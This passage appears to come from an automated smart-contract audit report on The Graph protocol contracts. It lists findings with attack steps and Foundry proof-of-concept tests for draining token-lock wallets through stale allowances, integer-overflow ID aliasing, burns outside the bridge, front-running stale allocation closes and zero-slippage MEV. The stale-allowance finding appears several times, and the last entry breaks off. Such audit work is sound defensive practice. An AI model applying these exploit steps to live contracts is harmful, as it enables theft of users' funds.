### Finding Status Justification: approveProtocol and revokeProtocol both query only the manager's current token destination list. Because historical approved destinations are not stored, a removed destination or previous manager destination keeps its max ERC20 allowance and cannot be cleared through revokeProtocol after it disappears from the current list. No complete safeguard is present. The wallet code is in scope. The destination set and manager are mutable today, so this is not future speculation. Normal beneficiary approval/revocation is not user error, and use of a stale allowance after deauthorization is not solely privileged actor abuse.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
GraphTokenLockWallet grants max GRT allowance to every destination returned by the current manager, but revokeProtocol only clears the manager's current destination list. If a destination is removed from the manager, or the wallet owner switches to a new manager, the old spender remains approved forever and future revokeProtocol calls cannot clear it.

Vulnerable snippet:
function approveProtocol() external onlyBeneficiary {
    address[] memory dstList = manager.getTokenDestinations();
    for (uint256 i = 0; i < dstList.length; i++) {
        token.approve(dstList[i], type(uint256).max);
    }
}

function revokeProtocol() external onlyBeneficiary {
    address[] memory dstList = manager.getTokenDestinations();
    for (uint256 i = 0; i < dstList.length; i++) {
        token.approve(dstList[i], 0);
    }
}

The active manager is treated as the source of truth for authorized token destinations, but historical approvals are not tracked. A removed destination that can execute transferFrom(address(wallet), ...) can still pull all locked GRT even though it is no longer authorized by manager.getTokenDestinations().

## Impact
A stale approved destination can steal the entire GRT balance held by affected lock wallets. For wallets holding more than $1M in GRT, this matches direct theft of user funds from an in-scope protocol smart contract.

## Proof of Concept
1. Manager lists destination D as an allowed token destination.
2. Beneficiary calls approveProtocol(), giving D uint256.max allowance from the wallet.
3. Manager owner removes D, or wallet owner switches to a new manager that does not list D.
4. Beneficiary calls revokeProtocol(), expecting all protocol approvals to be cleared.
5. revokeProtocol only iterates the current destination list, so allowance(wallet, D) remains uint256.max.
6. D calls token.transferFrom(wallet, attacker, walletBalance) and drains the locked tokens.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

import "forge-std/Test.sol";
import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/GraphTokenLockManager.sol";

contract MockToken {
    string public name = "Mock GRT";
    string public symbol = "GRT";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract PullDestination {
    function steal(MockToken token, address from, address to, uint256 amount) external { token.transferFrom(from, to, amount); }
}

contract StaleAllowancePoC is Test {
    function testRemovedDestinationStillDrainsWallet() external {
        address owner = address(0xA11CE);
        address beneficiary = address(0xB0B);
        address attacker = address(0xE0A);
        MockToken grt = new MockToken();
        GraphTokenLockWallet impl = new GraphTokenLockWallet();
        vm.prank(owner);
        GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(grt)), address(impl));
        PullDestination dst = new PullDestination();
        vm.prank(owner);
        manager.addTokenDestination(address(dst));
        GraphTokenLockWallet wallet = new GraphTokenLockWallet();
        wallet.initialize(address(manager), owner, beneficiary, address(grt), 1_000 ether, block.timestamp + 1, block.timestamp + 365 days, 1, 0, 0, IGraphTokenLock.Revocability.Disabled);
        grt.mint(address(wallet), 1_000 ether);
        vm.prank(beneficiary);
        wallet.approveProtocol();
        assertEq(grt.allowance(address(wallet), address(dst)), type(uint256).max);
        vm.prank(owner);
        manager.removeTokenDestination(address(dst));
        vm.prank(beneficiary);
        wallet.revokeProtocol();
        assertEq(grt.allowance(address(wallet), address(dst)), type(uint256).max);
        dst.steal(grt, address(wallet), attacker, 1_000 ether);
        assertEq(grt.balanceOf(attacker), 1_000 ether);
        assertEq(grt.balanceOf(address(wallet)), 0);
    }
}

## Suggested Mitigation
Track every destination ever approved by the wallet and clear that set in revokeProtocol before or in addition to the current manager list. Also clear old-manager allowances inside setManager before updating manager, or store per-wallet approved destinations and require allowance(dst) == 0 when a destination is removed.


## [M-41]. Unchecked subgraph ID alias math can wrap L1 IDs into L2 native namespace

## id: NcpuLMyKuo880l0y6oqmP

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
IntegerOverflow

## Location
L2GNS.getAliasedL2SubgraphID/getUnaliasedL1SubgraphID

## Finding Status: Valid
### Finding Status Justification: The exact arithmetic exists in in-scope L2GNS and uses raw addition/subtraction under Solidity 0.7.6. The declared using SafeMathUpgradeable does not protect + or - operators. _receiveSubgraphFromL1 computes l2SubgraphID through getAliasedL2SubgraphID and then stores transfer data and mints the NFT under that ID. No shown code bounds _l1SubgraphID or checks that the alias remains at least SUBGRAPH_ID_ALIAS_OFFSET. Although the bridge callback itself is restricted to the configured gateway and L1 counterpart, that is the normal bridge execution path and does not make this a trusted-role abuse finding. A legitimate L1 subgraph ID in the overflowing range can currently trigger the wrap/collision behavior, so the issue is not speculative or by design.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
L2GNS is compiled with Solidity 0.7.6 and uses raw arithmetic for cross-chain ID aliasing. Vulnerable snippets: `return _l1SubgraphID + SUBGRAPH_ID_ALIAS_OFFSET;` and `return _l2SubgraphID - SUBGRAPH_ID_ALIAS_OFFSET;`. In Solidity 0.7.x these operations wrap instead of reverting. Any accepted L1 subgraph ID greater than `type(uint256).max - SUBGRAPH_ID_ALIAS_OFFSET` aliases into the low, non-aliased L2 namespace. This violates the intended invariant that aliased L2 IDs are always at least `SUBGRAPH_ID_ALIAS_OFFSET` and creates a namespace collision/ambiguity between bridged IDs and native L2 subgraph IDs.

## Impact
High-valued L1 subgraphs whose IDs fall in the overflowing range can be represented by unexpected low L2 IDs. This can cause bridge receive/finalization accounting to target the wrong namespace, collide with existing or future native IDs, or permanently revert receipt if the wrapped token ID is already minted, freezing the bridge transfer.

## Proof of Concept
1. A valid L1 subgraph ID lies above `type(uint256).max - SUBGRAPH_ID_ALIAS_OFFSET`. Since IDs are uint256 values, this range is not excluded by L2GNS. 2. The L1-to-L2 receive message calls `getAliasedL2SubgraphID(l1SubgraphID)`. 3. The addition wraps and returns a low L2 ID instead of an ID in the reserved aliased range. 4. `_receiveSubgraphFromL1` writes transfer data and mints the NFT under that low ID. 5. The bridged subgraph can now collide with native L2 subgraph IDs or fail if the wrapped ID already exists, breaking bridge finalization/accounting.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract AliasMathModel { uint256 public constant OFFSET = uint256(0x1111000000000000000000000000000000000000000000000000000000001111); function alias07(uint256 l1) external pure returns (uint256) { unchecked { return l1 + OFFSET; } } function unalias07(uint256 l2) external pure returns (uint256) { unchecked { return l2 - OFFSET; } } }
contract L2GNSAliasOverflowPoC is Test { function testAliasWrapsIntoLowNamespace() external { AliasMathModel m = new AliasMathModel(); uint256 offset = m.OFFSET(); uint256 l1 = type(uint256).max - offset + 1; uint256 l2 = m.alias07(l1); assertLt(l2, offset); assertEq(l2, 0); assertEq(m.unalias07(l2), l1); } }

## Suggested Mitigation
Use `SafeMathUpgradeable.add` and `SafeMathUpgradeable.sub` for both alias helpers or add explicit bounds: require `_l1SubgraphID <= type(uint256).max - SUBGRAPH_ID_ALIAS_OFFSET` before aliasing and require `_l2SubgraphID >= SUBGRAPH_ID_ALIAS_OFFSET` before unaliasing.


## [M-42]. Inherited burn paths let holders reduce L2 GRT supply outside the bridge

## id: tjEsNRrIhxiRFNmDx7oi6

## Derived From Pattern/Invariant
AccountingInvariantViolation: every L2 GRT supply decrease must pass through bridgeBurn and the configured gateway

## Exploit Type
AccountingInvariantViolation

## Location
L2GraphToken.burn / burnFrom

## Finding Status: Valid
### Finding Status Justification: The reported code path exists in the provided production-scope L2GraphToken. L2GraphToken inherits GraphTokenUpgradeable, and GraphTokenUpgradeable inherits ERC20BurnableUpgradeable, while L2GraphToken does not override burn() or burnFrom(). The intended bridge path bridgeBurn() is onlyGateway and emits BridgeBurned, but inherited public burn/burnFrom can reduce balances and totalSupply without msg.sender being the gateway and without BridgeBurned. No complete safeguard in the shown code blocks those inherited entrypoints; only bridgeBurn itself is gated. The behavior is not explicitly documented as an accepted risk; the L2GraphToken notice and initializer comment say minting/burning is meant to occur through the gateway/bridge. The path is currently executable by any holder for burn() or by an approved spender for burnFrom(). It does not require privileged access, compromised credentials, or future integration, and normal calls to public token functions are not solely user error.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L2GraphToken is documented as the bridged L2 representation of GRT, where supply is meant to be minted and burned only through L2GraphTokenGateway. However, it inherits ERC20BurnableUpgradeable through GraphTokenUpgradeable and does not override or disable burn() and burnFrom(). As a result, any holder can reduce totalSupply directly, and any approved spender can burn an account's L2 GRT, without msg.sender being the gateway and without emitting BridgeBurned.

Vulnerable inheritance/path:
contract L2GraphToken is GraphTokenUpgradeable, IArbToken { ... }
abstract contract GraphTokenUpgradeable is GraphUpgradeable, Governed, ERC20BurnableUpgradeable { ... }

The intended bridge burn path is:
function bridgeBurn(address _account, uint256 _amount) external override onlyGateway {
    burnFrom(_account, _amount);
    emit BridgeBurned(_account, _amount);
}

But inherited ERC20BurnableUpgradeable exposes public burn(amount) and burnFrom(account, amount) outside onlyGateway.

## Impact
L2 totalSupply can decrease without an authenticated L2-to-L1 bridge withdrawal, permanently desynchronizing L2 supply from the L1 escrowed backing for the burned amount. The burned L2 GRT receives no corresponding L1 release and no BridgeBurned event, breaking bridge accounting and downstream supply/event assumptions.

## Proof of Concept
1. Alice has L2 GRT that was previously minted through the bridge.
2. Alice, or any spender with Alice's ERC20 allowance, calls the inherited burn() or burnFrom() function directly on L2GraphToken.
3. The call succeeds even though msg.sender is not gateway.
4. totalSupply and Alice's balance decrease, but bridgeBurn() was not used and BridgeBurned is not emitted.
5. The corresponding L1 escrow backing is not released, leaving bridge supply accounting desynchronized.

## Proof of Code
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../contracts/l2/token/L2GraphToken.sol";

contract L2GraphTokenHarness is L2GraphToken {
    function init(address owner) external {
        GraphTokenUpgradeable._initialize(owner, 0);
    }

    function mintForTest(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract L2GraphTokenNonBridgeBurnPoC is Test {
    L2GraphTokenHarness token;
    address governor = address(0xA11CE);
    address alice = address(0xB0B);
    address spender = address(0xCAFE);

    function setUp() public {
        token = new L2GraphTokenHarness();
        token.init(governor);
        token.mintForTest(alice, 100 ether);
    }

    function testHolderCanBurnOutsideGateway() public {
        uint256 supplyBefore = token.totalSupply();
        uint256 balanceBefore = token.balanceOf(alice);

        vm.prank(alice);
        token.burn(1 ether);

        assertEq(token.totalSupply(), supplyBefore - 1 ether);
        assertEq(token.balanceOf(alice), balanceBefore - 1 ether);
    }

    function testApprovedSpenderCanBurnFromOutsideGateway() public {
        uint256 supplyBefore = token.totalSupply();
        uint256 balanceBefore = token.balanceOf(alice);

        vm.prank(alice);
        token.approve(spender, 10 ether);

        vm.prank(spender);
        token.burnFrom(alice, 10 ether);

        assertEq(token.totalSupply(), supplyBefore - 10 ether);
        assertEq(token.balanceOf(alice), balanceBefore - 10 ether);
        assertEq(token.allowance(alice, spender), 0);
    }
}

## Suggested Mitigation
Override burn() and burnFrom() in L2GraphToken to revert, or remove ERC20BurnableUpgradeable from the L2 token inheritance tree. Use an internal _bridgeBurn(account, amount) helper that is reachable only from bridgeBurn() after onlyGateway has passed, so every L2 supply decrease is authenticated by the gateway and emits BridgeBurned.


## [M-43]. Denied subgraphs reclaim pre-denial rewards already snapshotted for active allocations

## id: oA5-8p36HSkX_wVoUwknn

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
RewardsManager.takeRewards

## Finding Status: Valid
### Finding Status Justification: The privileged oracle only performs the intended deny action; the alleged loss of pre-denial, already-snapshotted rewards occurs later through normal claim/reclaim logic because _deniedRewards uses only live denial state and does not split pre-denial from post-denial accrual. This is not merely admin misuse or governance risk.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
setDenied first calls onSubgraphAllocationUpdate before setting denylist, which correctly snapshots rewards accrued before denial into accRewardsPerAllocatedToken. However takeRewards later checks only the live denylist flag and _deniedRewards reclaims or drops the entire calculated allocation reward, including the pre-denial accumulator gap. Vulnerable snippets: `_setDenied` calls `onSubgraphAllocationUpdate(subgraphDeploymentId);` before `denylist[subgraphDeploymentId] = sinceBlock;`, but `takeRewards` later does `if (_deniedRewards(rewards, indexer, _allocationID, subgraphDeploymentID)) return 0;`. This violates the invariant that only rewards accrued during the denied interval should be reclaimed or dropped.

## Impact
Eligible active allocations can permanently lose rewards that accrued before the subgraph was denied; those rewards are minted to a reclaim target or dropped instead of being assigned to the rewards issuer.

## Proof of Concept
1. A subgraph has signal and an active allocation with rewards accrued while not denied. 2. The subgraph availability oracle calls setDenied(subgraph, true). 3. setDenied snapshots the pre-denial rewards into accRewardsPerAllocatedToken before denylist is set. 4. The allocation claims while the subgraph remains denied. 5. takeRewards calculates the pre-denial accumulator gap as rewards, then _deniedRewards sees the live deny flag and reclaims/drops the full amount instead of paying the allocation.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract RewardsManagerDenyModel {
    uint256 constant FP = 1e18;
    uint256 public accRewardsPerSignal;
    uint256 public accRewardsPerSignalSnapshot;
    uint256 public accRewardsForSubgraph;
    uint256 public accRewardsForSubgraphSnapshot;
    uint256 public accRewardsPerAllocatedToken;
    uint256 public denySinceBlock;
    uint256 public reclaimed;
    uint256 public signalledTokens = 100e18;
    uint256 public allocatedTokens = 100e18;

    function accrueGlobal(uint256 delta) external { accRewardsPerSignal += delta; }

    function onSubgraphAllocationUpdate() public returns (uint256) {
        uint256 rewardsSinceSignalSnapshot = (accRewardsPerSignal - accRewardsPerSignalSnapshot) * signalledTokens / FP;
        accRewardsPerSignalSnapshot = accRewardsPerSignal;
        uint256 undistributedRewards = (accRewardsForSubgraph - accRewardsForSubgraphSnapshot) + rewardsSinceSignalSnapshot;
        if (denySinceBlock != 0) {
            reclaimed += undistributedRewards;
            undistributedRewards = 0;
        } else {
            accRewardsForSubgraph += rewardsSinceSignalSnapshot;
        }
        accRewardsForSubgraphSnapshot = accRewardsForSubgraph;
        if (undistributedRewards != 0) accRewardsPerAllocatedToken += undistributedRewards * FP / allocatedTokens;
        return accRewardsPerAllocatedToken;
    }

    function setDenied() external { onSubgraphAllocationUpdate(); denySinceBlock = block.number; }

    function takeRewards() external returns (uint256) {
        uint256 updatedAcc = onSubgraphAllocationUpdate();
        uint256 rewards = allocatedTokens * updatedAcc / FP;
        if (denySinceBlock != 0) { reclaimed += rewards; return 0; }
        return rewards;
    }
}

contract RewardsManagerDeniedPreDenialPoC is Test {
    function testDeniedSubgraphReclaimsPreDeniedRewards() public {
        vm.roll(1);
        RewardsManagerDenyModel rm = new RewardsManagerDenyModel();
        rm.accrueGlobal(1e18);
        rm.setDenied();
        assertEq(rm.accRewardsPerAllocatedToken(), 1e18);
        uint256 paid = rm.takeRewards();
        assertEq(paid, 0);
        assertEq(rm.reclaimed(), 100e18);
    }
}

## Suggested Mitigation
Snapshot denial boundaries per subgraph/allocation and split rewards into pre-denial and post-denial portions. In takeRewards, pay rewards whose accumulator delta was accrued before denySinceBlock, and reclaim/drop only rewards accrued after denial. Alternatively, update allocation pending rewards before setting denylist so later denial checks cannot sweep the already-earned accumulator gap.


## [H-44]. Permissionless stale allocation close can front-run indexer POI close and permanently forfeit rewards

## id: i1VPtkROwgKUtZ8kYUL4T

## Derived From Pattern/Invariant
MaturityorGatingByPass / permissionless stale allocation closure can bypass authorized POI reward distribution

## Exploit Type
FrontrunMev

## Location
L1Staking.closeAllocation

## Finding Status: Valid
### Finding Status Justification: The stale-close branch exists in in-scope Staking.closeAllocation. _closeAllocation waives the authorization requirement when epochs > __maxAllocationEpochs and alloc.tokens != 0. A non-indexer caller in that state has isIndexerOrOperator false, so even with _poi == 0 the function calls _updateRewards rather than _distributeRewards, then marks __allocations[_allocationID].closedAtEpoch. After that the allocation is no longer Active, so an indexer/operator cannot close it again with a POI to call rewardsManager.takeRewards. The permissionless stale close is intentional as a mechanism, but the exact forfeiture/front-run risk is not explicitly accepted in the prompt. No safeguard preserves later reward claiming.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L1Staking inherits Staking.closeAllocation(), which intentionally waives the indexer/operator authorization check once an allocation is older than maxAllocationEpochs and has nonzero tokens. In that branch, a permissionless caller is treated as not authorized, so the close path calls _updateRewards() instead of _distributeRewards(). Because closedAtEpoch is then written, the authorized indexer/operator can no longer close the same allocation with a valid POI and call RewardsManager.takeRewards(). Vulnerable snippet: bool isIndexerOrOperator = _isAuth(alloc.indexer); if (epochs <= __maxAllocationEpochs || alloc.tokens == 0) { require(isIndexerOrOperator, "!auth"); } ... if (isIndexerOrOperator && _poi != 0 && epochs > 0) { _distributeRewards(_allocationID, alloc.indexer); } else { _updateRewards(alloc.subgraphDeploymentID); } ... __allocations[_allocationID].closedAtEpoch = alloc.closedAtEpoch;

## Impact
A searcher or competing participant can permanently deny indexing rewards for stale but still active allocations by closing them before the indexer/operator transaction. For large allocations this can cause significant accrued GRT rewards to be lost from the indexer and its delegators rather than distributed from protocol reward accounting.

## Proof of Concept
1. An indexer creates a nonzero allocation and lets it remain active past maxAllocationEpochs. 2. The indexer submits closeAllocation(allocationID, validPOI) to claim accumulated rewards. 3. A permissionless caller observes the transaction and front-runs closeAllocation(allocationID, 0). 4. Because epochs > maxAllocationEpochs and alloc.tokens > 0, the auth check is skipped. 5. Since msg.sender is not the indexer/operator, _updateRewards() runs instead of _distributeRewards(), then the allocation is marked closed. 6. The indexer's later transaction reverts with !active, so takeRewards() can never be called for that allocation.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockRewardsManager {
    uint256 public distributed;
    uint256 public updated;
    function takeRewards(address) external returns (uint256) { distributed += 1_000_000 ether; return 1_000_000 ether; }
    function onSubgraphAllocationUpdate(bytes32) external returns (uint256) { updated += 1; return updated; }
}

contract StaleCloseHarness {
    struct Allocation { address indexer; bytes32 subgraphDeploymentID; uint256 tokens; uint256 createdAtEpoch; uint256 closedAtEpoch; }
    mapping(address => Allocation) public allocations;
    mapping(address => mapping(address => bool)) public operatorAuth;
    uint256 public currentEpoch = 100;
    uint256 public maxAllocationEpochs = 10;
    MockRewardsManager public rewards;
    constructor(MockRewardsManager _rewards) { rewards = _rewards; }
    function create(address id, address indexer) external { allocations[id] = Allocation(indexer, bytes32("subgraph"), 1 ether, 1, 0); }
    function closeAllocation(address id, bytes32 poi) external {
        Allocation memory alloc = allocations[id];
        require(alloc.indexer != address(0) && alloc.closedAtEpoch == 0, "!active");
        alloc.closedAtEpoch = currentEpoch;
        uint256 epochs = alloc.closedAtEpoch - alloc.createdAtEpoch;
        bool isAuth = msg.sender == alloc.indexer || operatorAuth[alloc.indexer][msg.sender];
        if (epochs <= maxAllocationEpochs || alloc.tokens == 0) require(isAuth, "!auth");
        if (alloc.tokens > 0) {
            if (isAuth && poi != bytes32(0) && epochs > 0) rewards.takeRewards(id);
            else rewards.onSubgraphAllocationUpdate(alloc.subgraphDeploymentID);
        }
        allocations[id].closedAtEpoch = alloc.closedAtEpoch;
    }
}

contract StaleAllocationClosePoC is Test {
    function testPermissionlessClosePreventsRewardDistribution() external {
        address indexer = address(0x1111);
        address attacker = address(0xBEEF);
        address allocationID = address(0xA110C);
        MockRewardsManager rewards = new MockRewardsManager();
        StaleCloseHarness staking = new StaleCloseHarness(rewards);
        staking.create(allocationID, indexer);

        vm.prank(attacker);
        staking.closeAllocation(allocationID, bytes32(0));

        assertEq(rewards.updated(), 1);
        assertEq(rewards.distributed(), 0);

        vm.prank(indexer);
        vm.expectRevert(bytes("!active"));
        staking.closeAllocation(allocationID, bytes32("valid-poi"));

        assertEq(rewards.distributed(), 0);
    }
}


## Suggested Mitigation
Do not make reward-bearing stale allocation closure fully permissionless, or preserve the authorized reward path after a stale close. For example, require indexer/operator authorization whenever a nonzero POI/reward claim remains possible, add a separate permissionless mark-stale path that does not finalize reward eligibility, or let the indexer/operator submit a POI and claim rewards for an allocation closed by a third party within a bounded follow-up window.


## [H-45]. Zero-slippage curation burns let MEV force losses during L1GNS lifecycle migrations

## id: GhuG5LBZRxCkptR7_jsC-

## Derived From Pattern/Invariant
FlashLoanEconomicManipulation

## Exploit Type
FlashLoanEconomicManipulation

## Location
L1GNS.deprecateSubgraph / publishNewVersion / sendSubgraphToL2

## Finding Status: Valid
### Finding Status Justification: The root cause exists in the provided production source: deprecateSubgraph, sendSubgraphToL2, and publishNewVersion route whole subgraph curation positions through curation.burn(..., 0), with publishNewVersion also calling curation.mint(..., 0). There is no caller-supplied minimum output for these lifecycle operations. The functions are owner-triggered, but the manipulation leg is permissionless and does not require admin, leaked keys, or trusted-role abuse. The behavior is not documented as an accepted MEV risk. Existing code provides no complete safeguard against execution at manipulated curation prices.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L1GNS/GNS moves an entire subgraph curation position through the external Curation market with hard-coded zero minimum outputs. Vulnerable snippets: `curation().burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0)` in `deprecateSubgraph()` and `sendSubgraphToL2()`, plus `curation.burn(..., 0)` and `curation.mint(..., 0)` in `publishNewVersion()`. Unlike user-facing `mintSignal()` and `burnSignal()`, which expose `_nSignalOutMin` / `_tokensOutMin`, these owner-triggered whole-pool lifecycle operations accept any Curation output. A permissionless curation trader can front-run or atomically manipulate the deployment's curation state before the owner transaction and make all curators accept a materially worse burn/migration price.

## Impact
If a high-value subgraph has significant GRT curated, a MEV trader can extract or destroy value from the full subgraph curation position during deprecation, L2 transfer, or version publication. This can cause significant user funds to be lost directly from the protocol curation/GNS accounting, bounded by the value of the subgraph's curated GRT.

## Proof of Concept
1. A subgraph has a large `vSignal` / `nSignal` balance backing many curators. 2. The owner submits `deprecateSubgraph()`, `sendSubgraphToL2()`, or `publishNewVersion()`. 3. An MEV trader sees the transaction and manipulates the old deployment's Curation spot state before it executes. 4. L1GNS calls `curation.burn(..., 0)` and accepts the manipulated low token output. 5. `withdrawableGRT` or bridged/migrated tokens are recorded using the bad output, socializing the loss across curators while the trader unwinds the manipulation.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract MockCuration {
    uint256 public burnRateBps = 10000;
    function setBurnRateBps(uint256 bps) external { burnRateBps = bps; }
    function burn(bytes32, uint256 amount, uint256 minOut) external view returns (uint256 out) {
        out = amount * burnRateBps / 10000;
        require(out >= minOut, "slippage");
    }
}

contract GNSNoSlippageHarness {
    struct SubgraphData { bytes32 deployment; uint256 vSignal; uint256 nSignal; uint256 withdrawableGRT; bool disabled; address owner; }
    mapping(uint256 => SubgraphData) public subgraphs;
    MockCuration public curation;
    constructor(MockCuration c) { curation = c; }
    function seed(uint256 id, address owner, bytes32 deployment, uint256 signal) external {
        subgraphs[id] = SubgraphData(deployment, signal, signal, 0, false, owner);
    }
    function deprecateSubgraph(uint256 id) external {
        SubgraphData storage s = subgraphs[id];
        require(msg.sender == s.owner, "auth");
        if (s.nSignal != 0) {
            s.withdrawableGRT = curation.burn(s.deployment, s.vSignal, 0);
        }
        s.disabled = true;
        s.vSignal = 0;
    }
}

contract L1GNSZeroSlippagePoC is Test {
    function testMEVCanForceLifecycleOperationToAcceptBadCurationOutput() external {
        address owner = address(0xA11CE);
        MockCuration c = new MockCuration();
        GNSNoSlippageHarness gns = new GNSNoSlippageHarness(c);
        uint256 id = 1;
        uint256 curatedValue = 1_000_000 ether;
        gns.seed(id, owner, keccak256("oldDeployment"), curatedValue);

        c.setBurnRateBps(100); // attacker-manipulated 1% output accepted because minOut is hard-coded to 0
        vm.prank(owner);
        gns.deprecateSubgraph(id);

        (, , , uint256 withdrawableGRT,,) = gns.subgraphs(id);
        assertEq(withdrawableGRT, 10_000 ether);
        assertGt(curatedValue - withdrawableGRT, 990_000 ether);
    }
}

## Suggested Mitigation
Add explicit slippage parameters and deadlines to owner lifecycle functions, such as minimum burn output and minimum minted signal for `publishNewVersion()`, `deprecateSubgraph()`, and `sendSubgraphToL2()`. Revert if Curation output is below the caller-supplied bound, or use a multi-block/TWAP protected migration mechanism for whole-pool moves.


## [H-46]. Removed token destinations retain max allowance and can drain GraphTokenLockWallet balances

## id: 5SkoGbKdpm5OAUzjcRC-u

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation / stale authorization after manager or destination-set changes

## Exploit Type
AccessControl

## Location
GraphTokenLockWallet.revokeProtocol / setManager

## Finding Status: Valid
### Finding Status Justification: The code confirms the allowance drift: approveProtocol approves type(uint256).max for current destinations, and revokeProtocol only approves zero for destinations currently returned by manager.getTokenDestinations(). Removed destinations and old-manager destinations are not tracked or cleared. A spender with a transferFrom path can still consume the wallet allowance. There is no complete safeguard, and the target contracts are in scope. This does not require victim misuse; approving and later revoking are intended wallet actions. It is not explicitly accepted by docs and is exploitable under today's mutable destination/manager model.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
`approveProtocol()` grants `type(uint256).max` allowance to every destination returned by the current manager, but `revokeProtocol()` only revokes the manager's current destination list. If a destination is removed, or the wallet manager is changed, the old spender is no longer authorized by current manager state but keeps its ERC20 allowance forever.

Vulnerable snippet:
`function approveProtocol() external onlyBeneficiary { address[] memory dstList = manager.getTokenDestinations(); for (uint256 i = 0; i < dstList.length; i++) { token.approve(dstList[i], type(uint256).max); } }`

`function revokeProtocol() external onlyBeneficiary { address[] memory dstList = manager.getTokenDestinations(); for (uint256 i = 0; i < dstList.length; i++) { token.approve(dstList[i], 0); } }`

Because ERC20 allowance is keyed by spender address rather than by the manager's current authorization set, a removed destination can still call `transferFrom(wallet, attacker, amount)` directly if it controls the spender address or exposes a pull path.

## Impact
A formerly authorized token destination can transfer locked GRT out of the wallet after it has been removed from the active manager set. For large token-lock wallets this can become direct theft of significant protocol-held GRT.

## Proof of Concept
1. Beneficiary calls `approveProtocol()` while destination A is listed by the manager.
2. Manager later removes A or the wallet owner switches to a new manager that does not list A.
3. Beneficiary calls `revokeProtocol()` expecting all protocol approvals to be cleared.
4. The function only iterates the current destination list, so A's allowance remains `uint256.max`.
5. A calls `token.transferFrom(wallet, attacker, balance)` and drains the wallet.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockManager {
    address[] internal dsts;
    function setDestinations(address[] memory newDsts) external { dsts = newDsts; }
    function getTokenDestinations() external view returns (address[] memory) { return dsts; }
}

contract VulnerableWallet {
    MockToken public token;
    MockManager public manager;
    address public beneficiary;
    constructor(MockToken t, MockManager m, address b) { token = t; manager = m; beneficiary = b; }
    modifier onlyBeneficiary() { require(msg.sender == beneficiary, "!auth"); _; }
    function setManager(MockManager m) external { manager = m; }
    function approveProtocol() external onlyBeneficiary {
        address[] memory dstList = manager.getTokenDestinations();
        for (uint256 i; i < dstList.length; i++) token.approve(dstList[i], type(uint256).max);
    }
    function revokeProtocol() external onlyBeneficiary {
        address[] memory dstList = manager.getTokenDestinations();
        for (uint256 i; i < dstList.length; i++) token.approve(dstList[i], 0);
    }
}

contract StaleApprovalPoC is Test {
    function testRemovedDestinationStillDrainsWallet() public {
        address beneficiary = address(0xBEEF);
        address oldDestination = address(0xA11CE);
        address attacker = address(0xBAD);
        MockToken token = new MockToken();
        MockManager manager = new MockManager();
        VulnerableWallet wallet = new VulnerableWallet(token, manager, beneficiary);
        address[] memory one = new address[](1);
        one[0] = oldDestination;
        manager.setDestinations(one);
        token.mint(address(wallet), 100 ether);

        vm.prank(beneficiary);
        wallet.approveProtocol();
        assertEq(token.allowance(address(wallet), oldDestination), type(uint256).max);

        address[] memory empty = new address[](0);
        manager.setDestinations(empty);
        vm.prank(beneficiary);
        wallet.revokeProtocol();
        assertEq(token.allowance(address(wallet), oldDestination), type(uint256).max);

        vm.prank(oldDestination);
        token.transferFrom(address(wallet), attacker, 100 ether);
        assertEq(token.balanceOf(attacker), 100 ether);
        assertEq(token.balanceOf(address(wallet)), 0);
    }
}

## Suggested Mitigation
Track every spender approved by the wallet and clear that historical set in `revokeProtocol()` and before/after `setManager()`. Alternatively, store approvals per manager epoch and require removed destinations to be explicitly revoked before removal or manager replacement.


## [H-47]. Removed token destinations keep max wallet allowances and can drain locked GRT after revocation

## id: oOnSznkq-ikH8HEjjDvBw

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AccessControl

## Location
GraphTokenLockManager / GraphTokenLockWallet.removeTokenDestination / revokeProtocol

## Finding Status: Valid
